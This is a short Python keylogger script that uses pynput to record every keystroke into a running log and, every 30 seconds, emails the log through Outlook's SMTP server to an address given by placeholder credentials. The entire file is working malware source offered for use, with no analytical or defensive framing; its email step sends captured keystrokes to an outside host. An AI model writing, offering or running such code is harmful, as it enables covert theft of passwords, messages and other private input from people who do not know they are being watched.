import pynput.keyboard
import smtplib
import threading


log = ""


def listener_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key==key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)


def send_email(email, password, message):
    from email.mime.text import MIMEText
    msg = MIMEText(message, 'plain', 'utf-8')
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Keylogger Log'

    email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, msg.as_string())
    email_server.quit()



keylogger_listener = pynput.keyboard.Listener(on_press=listener_function)


def threadf():
    global log
    #change email and password
    send_email("example_email@outlook.com","example_password",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,threadf)
    timer_object.start()


with keylogger_listener:
    threadf()
    keylogger_listener.join()
